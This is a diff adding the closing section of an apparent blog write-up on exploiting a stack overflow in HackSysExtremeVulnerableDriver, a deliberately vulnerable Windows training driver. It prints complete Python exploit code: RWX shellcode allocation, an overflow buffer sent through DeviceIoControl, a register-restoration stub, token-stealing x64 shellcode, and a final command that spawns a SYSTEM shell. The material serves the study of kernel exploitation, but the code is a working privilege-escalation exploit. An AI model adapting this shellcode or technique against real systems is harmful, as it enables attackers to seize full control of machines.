@@ -224,4 +224,212 @@ As you can see, we were doing an `and qword ptr [rdi+38h]`. The reason we died t
 ## Correct Restoration, Final Exploit
 The only way I know how to restore RDI to what it's suppsoed to be, is to see when we run the exploit without an overflow, what the offset is between RDI and another register right before we enter our shellcode. 
 
+So once again, we have to go back to a non-overflow buffer size, and see what the register values are when we `ret` out of `TriggerStackOverflow`.
+
+If we set a breakpoint on that `ret` and run until we get there, we can dump the register values like so: 
+
+![](/assets/images/AWE/registers.PNG)
+
+We see that we have these register values: 
+```
+rax=0000000000000000 rbx=fffffa80062e06a0 rcx=fffff88004f7efe0
+rdx=0000077ffd394e20 rsi=fffffa8005539d10 rdi=fffffa80062e05d0
+rip=fffff880038815f4 rsp=fffff88004f7f7e8 rbp=0000000000000001
+ r8=0000000000000000  r9=0000000000000000 r10=4141414141414141
+r11=fffff88004f7f7e0 r12=fffffa8005b77370 r13=0000000000000000
+r14=fffffa80062e06e8 r15=0000000000000003
+```
+
+Our target, RDI has an offset of `d0` with RBX (RBX - RDI = `0xd0`). So what we can do then, is in our restoration stub of our shellcode, we can load RBX into RDI and then subtract `0xd0` from RDI and we should end up with the right value. 
+
+Let's try to get a clean run through with no crash. Our updated exploit code looks like this now:
+```python
+import ctypes, sys, struct
+from ctypes import *
+from subprocess import *
+import time
+
+kernel32 = windll.kernel32
+
+hevd = kernel32.CreateFileA(
+        "\\\\.\\HackSysExtremeVulnerableDriver", 
+        0xC0000000, 
+        0, 
+        None, 
+        0x3, 
+        0, 
+        None)
+    
+if (not hevd) or (hevd == -1):
+    print("[!] Failed to retrieve handle to device-driver with error-code: " + str(GetLastError()))
+    sys.exit(1)
+else:
+    print("[*] Successfully retrieved handle to device-driver: " + str(hevd))
+
+shellcode1 = (
+"\x90" * 100                                               
+)
+
+restoration_stub = (
+"\x48\x83\xc4\x28"               # add rsp,0x28 
+"\x48\x89\xDF"                   # mov rdi,rbx
+"\x48\x81\xEF\xD0\x00\x00\x00"   # sub rdi,0xd0
+"\xc3"                           # ret
+)
+
+shellcode = shellcode1 + restoration_stub
+
+addr = kernel32.VirtualAlloc(
+    c_int64(0),
+    c_int(len(shellcode)),
+    c_int(0x3000),
+    c_int(0x40)
+)
+
+if not addr:
+    print("[!] Error allocating shellcode RWX buffer")
+else:
+    print("[*] Allocated RWX buffer for shellcode @ {}").format(str(hex(addr)))
+
+memmove(addr,shellcode,len(shellcode))
+
+addr = struct.pack("<Q", addr)
+
+buf = create_string_buffer("A"*2048 + "B"*8 + addr)
+
+result = kernel32.DeviceIoControl(
+    hevd,
+    0x222003,
+    addressof(buf),
+    (len(buf)-1),
+    None,
+    0,
+    byref(c_ulong()),
+    None
+)
+
+if result != 0:
+        print("[*] Sending payload to driver...")
+else:
+    print("[!] Unable to send payload to driver.")
+    sys.exit(1)
+```
+
+Running this exploit code nets us a clean execution and we don't crash the kernel! 
+
+![](/assets/images/AWE/cleanaf.PNG)
+
+Now all that's left to do is add some real shellcode. I used the x64 shellcode from [@abatchy17's blog on the token-stealing payloads he was using](https://www.abatchy.com/2018/01/kernel-exploitation-2)
+
+But I also modified them so that I would push all the used registers onto the stack first to preserve their values and then pop them back at the end of the shellcode so that they would be restored. (The RDI corruption killing the kernel made me paranoid.)
+
+My final shellcode looked like this:
+```python
+shellcode1 = (
+"\x50\x51\x41\x53\x52\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00"
+"\x48\x8B\x40\x70\x48\x89\xC1\x49\x89\xCB\x49\x83\xE3\x07\xBA\x04"
+"\x00\x00\x00\x48\x8B\x80\x88\x01\x00\x00\x48\x2D\x88\x01\x00\x00"
+"\x48\x39\x90\x80\x01\x00\x00\x75\xEA\x48\x8B\x90\x08\x02\x00\x00"
+"\x48\x83\xE2\xF0\x4C\x09\xDA\x48\x89\x91\x08\x02\x00\x00\x5A\x41"
+"\x5B\x59\x58"                                               
+)
+
+restoration_stub = (
+"\x48\x83\xc4\x28"               # add rsp,0x28 
+"\x48\x89\xDF"                   # mov rdi,rbx
+"\x48\x81\xEF\xD0\x00\x00\x00"   # sub rdi,0xd0
+"\xc3"                           # ret
+)
+```
+
+I will leave it as an excercise for the reader to tease out the operations there. Please go read Abatchy's blog, it's a great resource. 
+
+Running our final exploit code gives us our desired privesc. 
+
+![](/assets/images/AWE/boom.PNG)
+
+Our final exploit code is here:
+```python
+import ctypes, sys, struct
+from ctypes import *
+from subprocess import *
+import time
+
+kernel32 = windll.kernel32
+
+hevd = kernel32.CreateFileA(
+        "\\\\.\\HackSysExtremeVulnerableDriver", 
+        0xC0000000, 
+        0, 
+        None, 
+        0x3, 
+        0, 
+        None)
+    
+if (not hevd) or (hevd == -1):
+    print("[!] Failed to retrieve handle to device-driver with error-code: " + str(GetLastError()))
+    sys.exit(1)
+else:
+    print("[*] Successfully retrieved handle to device-driver: " + str(hevd))
+
+shellcode1 = (
+"\x50\x51\x41\x53\x52\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00"
+"\x48\x8B\x40\x70\x48\x89\xC1\x49\x89\xCB\x49\x83\xE3\x07\xBA\x04"
+"\x00\x00\x00\x48\x8B\x80\x88\x01\x00\x00\x48\x2D\x88\x01\x00\x00"
+"\x48\x39\x90\x80\x01\x00\x00\x75\xEA\x48\x8B\x90\x08\x02\x00\x00"
+"\x48\x83\xE2\xF0\x4C\x09\xDA\x48\x89\x91\x08\x02\x00\x00\x5A\x41"
+"\x5B\x59\x58"                                               
+)
+
+restoration_stub = (
+"\x48\x83\xc4\x28"               # add rsp,0x28 
+"\x48\x89\xDF"                   # mov rdi,rbx
+"\x48\x81\xEF\xD0\x00\x00\x00"   # sub rdi,0xd0
+"\xc3"                           # ret
+)
+
+shellcode = shellcode1 + restoration_stub
+
+addr = kernel32.VirtualAlloc(
+    c_int64(0),
+    c_int(len(shellcode)),
+    c_int(0x3000),
+    c_int(0x40)
+)
+
+if not addr:
+    print("[!] Error allocating shellcode RWX buffer")
+else:
+    print("[*] Allocated RWX buffer for shellcode @ {}").format(str(hex(addr)))
+
+memmove(addr,shellcode,len(shellcode))
+
+addr = struct.pack("<Q", addr)
+
+buf = create_string_buffer("A"*2048 + "B"*8 + addr)
+
+result = kernel32.DeviceIoControl(
+    hevd,
+    0x222003,
+    addressof(buf),
+    (len(buf)-1),
+    None,
+    0,
+    byref(c_ulong()),
+    None
+)
+
+if result != 0:
+        print("[*] Sending payload to driver...")
+else:
+    print("[!] Unable to send payload to driver.")
+    sys.exit(1)
+
+print("[*] Spawning CMD shell with nt authority\system privs.")
+Popen("start cmd", shell=True)
+```
+
+## Conclusion
+This actually took me a long time to figure out. The problem with RDI I didn't see in any of the walkthroughs so it was a perfect opportunity for me to stand on my own. It was also a great opportunity to explore and use WinDBG some more. I'm so grateful for all of the amazing blog posts out there, thank you very much for the authors. Until next time!
+
 
